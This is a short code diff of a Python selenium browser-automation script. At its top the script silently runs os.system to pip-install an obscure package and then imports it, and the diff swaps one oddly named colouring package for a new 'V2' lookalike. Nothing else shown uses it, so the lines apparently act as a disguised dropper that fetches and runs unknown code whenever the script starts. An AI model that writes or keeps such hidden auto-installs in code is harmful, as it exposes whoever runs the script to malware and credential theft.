@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloradds")
-import pipcoloradds
+os.system("pip install pythoncolouringaddsV2")
+import pythoncolouringaddsV2
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
